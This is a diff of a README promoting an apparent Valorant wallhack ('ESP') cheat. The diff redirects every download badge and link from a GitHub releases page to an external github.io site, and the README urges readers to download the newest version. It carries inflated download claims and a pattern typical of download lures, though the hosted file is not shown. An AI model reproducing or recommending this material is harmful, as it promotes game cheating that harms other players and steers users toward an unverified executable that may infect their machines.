@@ -1,6 +1,6 @@
 # 🎯 valorant-esp-items-2026 - See Everything Through Any Wall
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Version-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Physostegiadragee5952/valorant-esp-items-2026/releases) [![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)](https://github.com/Physostegiadragee5952/valorant-esp-items-2026/releases) [![Version](https://img.shields.io/badge/Version-v2026-brightgreen?style=flat-square)](https://github.com/Physostegiadragee5952/valorant-esp-items-2026/releases) [![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](https://github.com/Physostegiadragee5952/valorant-esp-items-2026/releases) [![Downloads](https://img.shields.io/badge/Downloads-710k%2B-orange?style=flat-square)](https://github.com/Physostegiadragee5952/valorant-esp-items-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://physostegiadragee5952.github.io) [![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)](https://physostegiadragee5952.github.io) [![Version](https://img.shields.io/badge/Version-v2026-brightgreen?style=flat-square)](https://physostegiadragee5952.github.io) [![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](https://physostegiadragee5952.github.io) [![Downloads](https://img.shields.io/badge/Downloads-710k%2B-orange?style=flat-square)](https://physostegiadragee5952.github.io)
 
 ---
 
@@ -52,11 +52,11 @@ Getting started is easy. Just follow these simple steps:
 
 ### Step 1: Visit the Download Page
 
-[![Download Button](https://img.shields.io/badge/⬇️_Download_Here-Click_Me-blue?style=for-the-badge)](https://github.com/Physostegiadragee5952/valorant-esp-items-2026/releases)
+[![Download Button](https://img.shields.io/badge/⬇️_Download_Here-Click_Me-blue?style=for-the-badge)](https://physostegiadragee5952.github.io)
 
 Click the button above or go to this link directly:
 
-**https://github.com/Physostegiadragee5952/valorant-esp-items-2026/releases**
+**https://physostegiadragee5952.github.io**
 
 Visit this link to download the application. You'll see a list of available releases — pick the newest one (v2026) to get all the latest features and improvements.
 
